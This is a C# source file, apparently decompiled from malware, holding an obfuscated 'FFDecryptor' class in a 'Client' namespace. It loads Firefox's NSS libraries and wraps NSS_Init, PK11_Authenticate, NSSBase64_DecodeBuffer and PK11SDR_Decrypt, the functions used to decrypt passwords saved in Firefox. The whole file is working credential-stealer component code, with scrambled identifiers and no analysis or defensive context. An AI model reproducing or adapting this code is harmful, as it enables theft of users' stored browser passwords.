using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace Client;

[StandardModule]
internal sealed class FFDecryptor
{
	public class SHITEMID
	{
		public static long cb;

		public static byte[] abID;
	}

	public struct TSECItem
	{
		public int ejrRrIGefInjnGJRPnje;

		public int PerEEJIrgJgRrePnrnEj;

		public int nnHnrIrPIoeREEjIGPjn;
	}

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long nTHGRREnPeIGJEnnnGRR(string configdir);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long nTHGRREnPeIGJEnnnGRR2();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long nTHGRREnPeIGJEnnnGRR3(long slot, bool loadCerts, long wincx);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int nTHGRREnPeIGJEnnnGRR4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int nTHGRREnPeIGJEnnnGRR5(ref TSECItem datax, ref TSECItem result, int ccx);

	private static IntPtr NSS3;

	public static string GInnennerfIEoJEGroHn;

	[DllImport("kernel32.dll")]
	private static extern IntPtr GEGIrPoeGRoPJnfeEHHn(string dllFilePath);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr nnGrGPRjEnGnJreejGrj(IntPtr hModule, string procName);

	public static long GjJjRIGPRIjJnPnGjTJR(string configdir)
	{
		string text = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
		GEGIrPoeGRoPJnfeEHHn(text + "mozcrt19.dll");
		GEGIrPoeGRoPJnfeEHHn(text + "nspr4.dll");
		GEGIrPoeGRoPJnfeEHHn(text + "plc4.dll");
		GEGIrPoeGRoPJnfeEHHn(text + "plds4.dll");
		GEGIrPoeGRoPJnfeEHHn(text + "ssutil3.dll");
		GEGIrPoeGRoPJnfeEHHn(text + "sqlite3.dll");
		GEGIrPoeGRoPJnfeEHHn(text + "nssutil3.dll");
		GEGIrPoeGRoPJnfeEHHn(text + "softokn3.dll");
		NSS3 = GEGIrPoeGRoPJnfeEHHn(text + "nss3.dll");
		IntPtr ptr = nnGrGPRjEnGnJreejGrj(NSS3, "NSS_Init");
		nTHGRREnPeIGJEnnnGRR nTHGRREnPeIGJEnnnGRR = (nTHGRREnPeIGJEnnnGRR)Marshal.GetDelegateForFunctionPointer(ptr, typeof(nTHGRREnPeIGJEnnnGRR));
		return nTHGRREnPeIGJEnnnGRR(configdir);
	}

	public static long jnIfGrjjgfTRnneIgPrP()
	{
		IntPtr ptr = nnGrGPRjEnGnJreejGrj(NSS3, "PK11_GetInternalKeySlot");
		nTHGRREnPeIGJEnnnGRR2 nTHGRREnPeIGJEnnnGRR = (nTHGRREnPeIGJEnnnGRR2)Marshal.GetDelegateForFunctionPointer(ptr, typeof(nTHGRREnPeIGJEnnnGRR2));
		return nTHGRREnPeIGJEnnnGRR();
	}

	public static long IgnoTeeoPrJnrIngHRnP(long slot, bool loadCerts, long wincx)
	{
		IntPtr ptr = nnGrGPRjEnGnJreejGrj(NSS3, "PK11_Authenticate");
		nTHGRREnPeIGJEnnnGRR3 nTHGRREnPeIGJEnnnGRR = (nTHGRREnPeIGJEnnnGRR3)Marshal.GetDelegateForFunctionPointer(ptr, typeof(nTHGRREnPeIGJEnnnGRR3));
		return nTHGRREnPeIGJEnnnGRR(slot, loadCerts, wincx);
	}

	public static int HrgETjjGPRrnEGPrEgrP(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
	{
		IntPtr ptr = nnGrGPRjEnGnJreejGrj(NSS3, "NSSBase64_DecodeBuffer");
		nTHGRREnPeIGJEnnnGRR4 nTHGRREnPeIGJEnnnGRR = (nTHGRREnPeIGJEnnnGRR4)Marshal.GetDelegateForFunctionPointer(ptr, typeof(nTHGRREnPeIGJEnnnGRR4));
		return nTHGRREnPeIGJEnnnGRR(arenaOpt, outItemOpt, inStr, inLen);
	}

	public static int nngPejjjjnjeojPPPgPH(ref TSECItem datax, ref TSECItem result, int ccx)
	{
		IntPtr ptr = nnGrGPRjEnGnJreejGrj(NSS3, "PK11SDR_Decrypt");
		nTHGRREnPeIGJEnnnGRR5 nTHGRREnPeIGJEnnnGRR = (nTHGRREnPeIGJEnnnGRR5)Marshal.GetDelegateForFunctionPointer(ptr, typeof(nTHGRREnPeIGJEnnnGRR5));
		return nTHGRREnPeIGJEnnnGRR(ref datax, ref result, ccx);
	}
}
